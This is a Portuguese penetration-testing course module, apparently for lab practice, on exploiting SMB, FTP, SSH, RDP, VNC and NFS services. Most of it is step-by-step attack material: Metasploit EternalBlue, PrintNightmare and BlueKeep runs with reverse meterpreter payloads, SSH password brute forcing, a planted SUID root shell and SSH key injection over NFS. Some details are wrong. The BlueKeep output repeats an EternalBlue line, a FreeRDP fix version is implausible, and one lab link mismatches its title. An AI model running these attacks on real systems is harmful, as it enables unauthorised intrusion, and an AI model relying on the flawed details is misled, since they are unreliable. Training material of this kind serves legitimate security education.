# 🎯 05. Exploração de Serviços de Rede

> Cada serviço aberto é uma porta de entrada. SMB tem EternalBlue, RDP tem BlueKeep, NFS tem no_root_squash. Saiba como identificar e explorar cada um.

<div align="center">

| ⏱️ Tempo | 📊 Nível | 🔧 Ferramentas |
|:--------:|:--------:|:--------------:|
| 90min | ⭐⭐⭐⭐ Avançado | `metasploit, nmap, enum4linux-ng, smbclient, showmount` |

</div>

---

## 🎓 Por que isso importa?

Services de rede (SMB, FTP, SSH, RDP, VNC, NFS) representam a maior superfície de ataque para ganho de acesso inicial em redes corporativas. Cada um tem vetores específicos além do brute force: EternalBlue explora uma falha no protocolo SMB, BlueKeep permite execução remota via RDP sem autenticação, NFS com `no_root_squash` permite escalação de privilégios trivial.

**Regra de ouro:** Antes de tentar exploração, confirme que o serviço está vulnerável. Um scanner confiável (Nmap NSE, Metasploit auxiliary) evita crashes desnecessários.

**Progressão natural deste módulo:**
```
SMB → FTP → SSH → RDP → VNC → NFS
```

Cada serviço é independente — você pode pular direto ao que precisar.

---

## 📋 Pré-requisitos

| Conhecimento | Necessário? | Onde aprender |
|:-------------|:-----------:|:-------------:|
| Nmap básico (scan de portas/serviços) | Sim | Módulo 01 |
| Metasploit básico (msfconsole) | Sim | Módulo 02 |
| O que é buffer overflow, exploit, payload | Sim | Módulo 00 |

---

## 🎯 Quando usar este módulo

- Quando Nmap mostrou serviço com versão vulnerável
- Quando encontrou configuração incorreta (anon login, export aberto)
- Quando quer explorar falhas conhecidas (CVEs) para ganho de acesso
- Quando brute force não funciona e precisa de outra abordagem

---

## 📡 SMB (Server Message Block) — Porta 445

### Vetores de exploração

| Vetor | CVE | Status | Requer auth? |
|:------|:----|:-------|:-------------|
| EternalBlue / MS17-010 | CVE-2017-0143 a CVE-2017-0148 | ⚠️ Legado (Win7/2008) | Não |
| PrintNightmare | CVE-2021-1675 / CVE-2021-34527 | ⚠️ Legado | Sim |
| CVE-2025-33073 (NTLM Reflection) | CVE-2025-33073 | 🔴 Ativo (CISA KEV) | Sim |
| Null Session + Enumeração | Configuração | ⚠️ Comum | Não |

### Identificar vulnerabilidade

```bash
# Nmap — scan de vulnerabilidades SMB
nmap --script=smb-vuln-ms17-010 -p 445 <IP>

# Metasploit — scanner dedicado
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS <IP>
msf6 auxiliary(scanner/smb/smb_ms17_010) > exploit
```

**✅ Output esperado (vulnerável):**
```
[+] 192.168.1.10:445 - Host is likely VULNERABLE to MS17-010!
```

### Exploração — EternalBlue (MS17-010)

```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.10
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.100
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 4444
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

**✅ Output esperado (sucesso):**
```
[*] Connecting to target for exploitation.
[+] Connection established for exploitation.
[+] Target OS selected valid for OS indicated by SMB reply
[*] Trying exploit with 12 Groom Allocations.
[*] Sending all but last fragment of exploit packet
[*] Starting non-paged pool grooming
[+] Sending SMBv2 buffers
[+] ETERNALBLUE overwrite completed successfully (0xc000000d)!
[*] Et kernel exploit triggered successfully!
[*] Meterpreter session 1 opened (192.168.1.100:4444 -> 192.168.1.10:49152)
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

**⚠️ Aviso:** O exploit pode causar BSOD (Blue Screen). Funciona apenas em x64. Múltiplas tentativas podem ser necessárias.

### Exploração — PrintNightmare

```bash
msf6 > use exploit/windows/dcerpc/cve_2021_1675_printnightmare
msf6 exploit(windows/dcerpc/cve_2021_1675_printnightmare) > set RHOSTS 192.168.1.10
msf6 exploit(windows/dcerpc/cve_2021_1675_printnightmare) > set LHOST 192.168.1.100
msf6 exploit(windows/dcerpc/cve_2021_1675_printnightmare) > set SMBUser admin
msf6 exploit(windows/dcerpc/cve_2021_1675_printnightmare) > set SMBPass senha123
msf6 exploit(windows/dcerpc/cve_2021_1675_printnightmare) > exploit
```

**✅ Output esperado (sucesso):**
```
[*] Started reverse TCP handler on 192.168.1.100:4444
[*] Running automatic check
[*] Target environment: Windows v6.3 (Build 17763)
[*] Target arch: x64
[*] Exploiting...
[*] Meterpreter session 2 opened
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

**⚠️ Aviso:** Requer autenticação (credenciais válidas). O exploit é `UNRELIABLE_SESSION` — pode causar crash.

---

## 📡 FTP (File Transfer Protocol) — Porta 21

### Vetores de exploração

| Vetor | CVE | Status | Impacto |
|:------|:----|:-------|:--------|
| Anonymous Login | Configuração | ⚠️ Comum | Leitura/escrita de arquivos |
| FTP Bounce Scan | Configuração | ⚠️ Legado | Port scan via FTP |

### Identificar — Anonymous Login

```bash
# Nmap
nmap -p 21 --script ftp-anon <IP>

# Metasploit
msf6 > use auxiliary/scanner/ftp/ftp_anonymous
msf6 auxiliary(scanner/ftp/ftp_anonymous) > set RHOSTS <IP>
msf6 auxiliary(scanner/ftp/ftp_anonymous) > exploit
```

**✅ Output esperado:**
```
[+] 192.168.1.20:21 - Anonymous READ access (220 (vsFTPd 3.0.3))
```

### Exploração — Abusar Anonymous Login

```bash
# Listar diretórios via Metasploit
msf6 auxiliary(scanner/ftp/ftp_anonymous) > set ACTION LIST
msf6 auxiliary(scanner/ftp/ftp_anonymous) > run

# Conexão manual
ftp 192.168.1.20
# User: anonymous
# Pass: anonymous@

ftp> ls
ftp> cd incoming
ftp> put shell.sh
```

### Identificar — FTP Bounce

```bash
# Metasploit — Portscan via bounce
msf6 > use auxiliary/scanner/portscan/ftpbounce
msf6 auxiliary(scanner/portscan/ftpbounce) > set BOUNCEHOST 192.168.1.20
msf6 auxiliary(scanner/portscan/ftpbounce) > set RHOSTS 192.168.1.30
msf6 auxiliary(scanner/portscan/ftpbounce) > set FTPUSER anonymous
msf6 auxiliary(scanner/portscan/ftpbounce) > set PORTS 1-1000
msf6 auxiliary(scanner/portscan/ftpbounce) > exploit
```

**✅ Output esperado:**
```
[+] 192.168.1.20:21 - TCP OPEN 192.168.1.30:22
[+] 192.168.1.20:21 - TCP OPEN 192.168.1.30:80
[+] 192.168.1.20:21 - TCP OPEN 192.168.1.30:445
```

---

## 📡 SSH (Secure Shell) — Porta 22

### Vetores de exploração

| Vetor | CVE | Status | Requer auth? |
|:------|:----|:-------|:-------------|
| Brute Force / Credenciais fracas | CVE-1999-0502 | ⚠️ Comum | Não (é o ataque) |
| Key Abuse (chaves privadas) | Configuração | ⚠️ Comum | Sim (chave) |
| regreSSHion (race condition) | CVE-2024-6387 | 🟡 Difícil (~10k tentativas) | Não |
| Erlang SSH RCE | CVE-2025-32433 | 🔴 Pre-auth RCE | Não |

### Identificar versão SSH

```bash
msf6 > use auxiliary/scanner/ssh/ssh_version
msf6 auxiliary(scanner/ssh/ssh_version) > set RHOSTS <IP>
msf6 auxiliary(scanner/ssh/ssh_version) > exploit
```

**✅ Output esperado:**
```
[*] 192.168.1.30:22 - SSH server version: SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u2
```

### Exploração — Brute Force com Metasploit

```bash
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.1.30
msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME root
msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/seclists/Passwords/Top1000.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set THREADS 10
msf6 auxiliary(scanner/ssh/ssh_login) > exploit
```

**✅ Output esperado:**
```
[+] 192.168.1.30:22 - Success: 'root:toor'
```

### Exploração — Key Abuse

```bash
# Verificar se chave pública é aceita
msf6 > use auxiliary/scanner/ssh/ssh_identify_pubkeys
msf6 auxiliary(scanner/ssh/ssh_identify_pubkeys) > set RHOSTS 192.168.1.30
msf6 auxiliary(scanner/ssh/ssh_identify_pubkeys) > set KEY_FILE /path/to/keys.txt
msf6 auxiliary(scanner/ssh/ssh_identify_pubkeys) > set USERNAME root
msf6 auxiliary(scanner/ssh/ssh_identify_pubkeys) > exploit
```

**✅ Output esperado:**
```
[+] 192.168.1.30:22 - Public key accepted: 'root' with key 'SHA256:xxxxx'
```

```bash
# Usar chave privada para autenticar
msf6 auxiliary(scanner/ssh/ssh_login) > set KEY_PATH /path/to/id_rsa
msf6 auxiliary(scanner/ssh/ssh_login) > exploit
```

---

## 📡 RDP (Remote Desktop Protocol) — Porta 3389

### Vetores de exploração

> **Atenção:** Vetores RDP se dividem em duas categorias completamente distintas:
> - **Server-side:** O atacante ataca o **serviço RDP do alvo** diretamente (sem interação de vítima). É o caso do BlueKeep.
> - **Client-side:** O atacante ataca **quem usa o cliente RDP** (precisa que a vítima abra um arquivo malicioso). É o caso do CVE-2026-64624.
>
> Não misture as duas categorias — têm vetores, impactos e requisitos completamente diferentes.

#### Server-side (ataque direto ao serviço RDP)

| Vetor | CVE | Status | Requer auth? |
|:------|:----|:-------|:-------------|
| BlueKeep (pre-auth RCE) | CVE-2019-0708 | ⚠️ Legado (Win7/2008) | Não |
| Brute Force RDP | CVE-1999-0502 | ⚠️ Comum | Não (é o ataque) |

#### Client-side (ataque ao cliente RDP — requer interação da vítima)

| Vetor | CVE | Status | Requer interação? |
|:------|:----|:-------|:------------------|
| FreeRDP RCE via .rdp malicioso | CVE-2026-64624 | 🔴 Ativo (Jul 2026) | **Sim** — vítima deve abrir arquivo .rdp |

### Identificar — BlueKeep

```bash
msf6 > use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
msf6 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) > set RHOSTS <IP>
msf6 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) > exploit
```

**✅ Output esperado (vulnerável):**
```
[+] 192.168.1.40:3389 - The target attempted cleanup of the incorrectly-bound MS_T120 channel.
```

### Exploração — BlueKeep

```bash
msf6 > use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set RHOSTS 192.168.1.40
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set LHOST 192.168.1.100
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > show targets
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set TARGET 3
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > exploit
```

**✅ Output esperado:**
```
[*] Using CHUNK grooming strategy. Size 250MB.
[*] Surfing channels ...
[*] Lobbing eggs ...
[+] ETERNALBLUE overwrite completed successfully!
[*] Meterpreter session 3 opened
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

**Pré-requisitos:** NLA (CredSSP) desabilitado no alvo. Selecionar o target correto (VMWare, Virtualbox, Hyper-V).

### Nota sobre CVE-2026-64624 (FreeRDP — Client-Side)

Este CVE é um **vetor client-side**: o atacante cria um arquivo `.rdp` malicioso com opções de linha de comando que executam comandos arbitrários quando a vítima o abre com o FreeRDP. **Não existe módulo Metasploit** — o ataque depende de engenharia social para que a vítima abra o arquivo.

**Vetor de ataque:**
```
Atacante cria .rdp malicioso → Envia para vítima (email, chat) → Vítima abre → Comando executado
```

**Diferença fundamental do BlueKeep:**
| Aspecto | BlueKeep (CVE-2019-0708) | FreeRDP (CVE-2026-64624) |
|:--------|:-------------------------|:-------------------------|
| Tipo | Server-side | Client-side |
| Interação da vítima | **Nenhuma** | **Obrigatória** (abrir .rdp) |
| Alvo | Serviço RDP do servidor | Cliente RDP da vítima |
| Autenticação | Não precisa | Vítima precisa estar logada |
| Exploração | Automatizada via Metasploit | Depende de engenharia social |

**Mitigação:** Atualizar FreeRDP para versão ≥ 0.10.6. Não abrir arquivos .rdp de fontes não confiáveis.

---

## 📡 VNC (Virtual Network Computing) — Porta 5900

### Vetores de exploração

| Vetor | CVE | Status | Impacto |
|:------|:----|:-------|:--------|
| Auth "None" (sem senha) | CVE-2006-2369 | ⚠️ Configuração | Acesso direto ao desktop |
| Brute Force VNC | CVE-1999-0502 | ⚠️ Comum | Acesso ao desktop |

### Identificar — VNC None Auth

```bash
msf6 > use auxiliary/scanner/vnc/vnc_none_auth
msf6 auxiliary(scanner/vnc/vnc_none_auth) > set RHOSTS <IP>
msf6 auxiliary(scanner/vnc/vnc_none_auth) > exploit
```

**✅ Output esperado (vulnerável):**
```
[*] 192.168.1.50:5900 - VNC server protocol version: 3.8
[*] 192.168.1.50:5900 - VNC server security types supported: None, VNC Authentication
[+] 192.168.1.50:5900 - VNC server security types includes None, free access!
```

### Exploração — Conectar diretamente

```bash
# Via Metasploit
msf6 > use auxiliary/admin/vnc/realvnc_41_bypass
msf6 auxiliary(admin/vnc/realvnc_41_bypass) > set RHOSTS <IP>
msf6 auxiliary(admin/vnc/realvnc_41_bypass) > set AUTOVNC true
msf6 auxiliary(admin/vnc/realvnc_41_bypass) > exploit

# Ou manualmente
vncviewer 192.168.1.50::5900
```

---

## 📡 NFS (Network File System) — Portas 111, 2049

### Vetores de exploração

| Vetor | CVE | Status | Impacto |
|:------|:----|:-------|:--------|
| `no_root_squash` em export | Configuração | ⚠️ Comum | Escalação de privilégios para root |
| Export list pública | Configuração | ⚠️ Comum | Enumeração de diretórios |

### Identificar — Enumeração de exports

```bash
# Nmap
nmap -p 111,2049 --script nfs-showmount,nfs-ls <IP>

# showmount
showmount -e 192.168.1.60

# Metasploit
msf6 > use auxiliary/scanner/nfs/nfsmount
msf6 auxiliary(scanner/nfs/nfsmount) > set RHOSTS <IP>
msf6 auxiliary(scanner/nfs/nfsmount) > exploit
```

**✅ Output esperado (showmount):**
```
Export list for 192.168.1.60:
/srv/share *
/home/user 192.168.1.0/24
```

**✅ Output esperado (Metasploit):**
```
[+] 192.168.1.60 Mountable NFS Export: /srv/share [*]
[+] 192.168.1.60 Mountable NFS Export: /home/user [192.168.1.0/24]
```

### Exploração — Abusar `no_root_squash`

**Passo 1 — Montar o share:**
```bash
sudo mkdir -p /mnt/nfs
sudo mount -t nfs -o vers=3 192.168.1.60:/srv/share /mnt/nfs
```

**Passo 2 — Verificar se `no_root_squash` está ativo:**
```bash
sudo touch /mnt/nfs/test_root
ls -l /mnt/nfs/test_root
# Se mostrar root:root → no_root_squash ativo
# Se mostrar nobody:nogroup → root_squash ativo (não explorável)
```

**Passo 3 — Plantar binário SUID root:**
```bash
sudo cp /bin/bash /mnt/nfs/rootshell
sudo chmod +s /mnt/nfs/rootshell
sudo chown root:root /mnt/nfs/rootshell
ls -l /mnt/nfs/rootshell
# -rwsr-sr-x 1 root root ... /mnt/nfs/rootshell
```

**Passo 4 — Executar no target (de shell de baixo privilégio):**
```bash
/srv/share/rootshell -p
# bash-5.1# id
# uid=0(root) gid=0(root)
```

**Método alternativo — Injeção de chave SSH (se /root exportado):**
```bash
sudo mount -t nfs 192.168.1.60:/root /mnt/nfs -o nolock
sudo mkdir -p /mnt/nfs/.ssh
sudo bash -c "cat ~/.ssh/id_rsa.pub >> /mnt/nfs/.ssh/authorized_keys"
sudo chmod 700 /mnt/nfs/.ssh
sudo chmod 600 /mnt/nfs/.ssh/authorized_keys
ssh root@192.168.1.60
```

**Desmontar:**
```bash
sudo umount /mnt/nfs
```

---

## 📋 Resumo: Qual Serviço Explorar

| Serviço | Vetor principal | Ferramenta | Comando rápido |
|:--------|:----------------|:-----------|:---------------|
| SMB 445 | EternalBlue | Metasploit | `use exploit/windows/smb/ms17_010_eternalblue` |
| SMB 445 | PrintNightmare | Metasploit | `use exploit/windows/dcerpc/cve_2021_1675_printnightmare` |
| FTP 21 | Anonymous Login | Metasploit | `use auxiliary/scanner/ftp/ftp_anonymous` |
| SSH 22 | Brute Force | Metasploit | `use auxiliary/scanner/ssh/ssh_login` |
| RDP 3389 | BlueKeep | Metasploit | `use exploit/windows/rdp/cve_2019_0708_bluekeep_rce` |
| VNC 5900 | None Auth | Metasploit | `use auxiliary/scanner/vnc/vnc_none_auth` |
| NFS 2049 | no_root_squash | Manual | `mount -t nfs <IP>:/share /mnt/nfs` |

---

## ❌ Erros Comuns

| Erro | Solução |
|:-----|:--------|
| "EternalBlue causa BSOD" | Use `MaxExploitAttempts 2`; tente em outro horário |
| "BlueKeep não funciona" | Verifique NLA desabilitado; selecione target correto |
| "NFS mount falha" | Verifique portas 111 e 2049 abertas; use `-o vers=3` |
| "FTP anon não lista arquivos" | Tente `set ACTION LIST`; verifique permissões |
| "VNC None Auth não funciona" | Nem todo VNC aceita None; tente brute force |

---

## 🧪 Labs Práticos

| # | Plataforma | Lab | O que praticar | Tempo |
|---|:----------:|:----|:---------------|:-----:|
| 1 | TryHackMe | [Blue](https://tryhackme.com/room/blue) | EternalBlue (MS17-010) completo | 60min |
| 2 | TryHackMe | [Iconic](https://tryhackme.com/room/rplicity) | RDP, enumeração, exploração | 60min |
| 3 | HackTheBox | [Archetype](https://app.hackthebox.com/machines/Archetype) | SMB, MSSQL, escalação | 90min |
| 4 | OverTheWire | [Narnia](https://overthewire.org/wargames/narnia/) | Exploração binária básica | 30min |

---

## 📚 Referências

- [HackTricks — Pentesting SMB](https://book.hacktricks.xyz/network-services-pentaging/pentesting-smb)
- [HackTricks — Pentesting FTP](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp)
- [HackTricks — Pentesting SSH](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh)
- [HackTricks — Pentesting RDP](https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp)
- [HackTricks — Pentesting VNC](https://book.hacktricks.xyz/network-services-pentaging/pentesting-vnc)
- [HackTricks — Pentesting NFS](https://book.hacktricks.xyz/network-services-pentesting/pentesting-nfs-nfs-mount)
- [Rapid7 — MS17-010](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/)
- [Rapid7 — BlueKeep](https://www.rapid7.com/db/modules/exploit/windows/rdp/cve_2019_0708_bluekeep_rce/)
- [CVE-2025-33073 PoC](https://github.com/mverschu/CVE-2025-33073)

---

## ✅ Validação

Após este módulo, você deve conseguir:

- [ ] Identificar SMB vulnerável a EternalBlue com Nmap NSE
- [ ] Explorar MS17-010 com Metasploit e obter shell SYSTEM
- [ ] Detectar e abusar anonymous login em FTP
- [ ] Verificar versão SSH e identificar CVEs relevantes
- [ ] Identificar e explorar BlueKeep em RDP
- [ ] Detectar VNC sem autenticação e conectar diretamente
- [ ] Enumerar exports NFS e abusar `no_root_squash`
- [ ] Montar share NFS e plantar binário SUID root
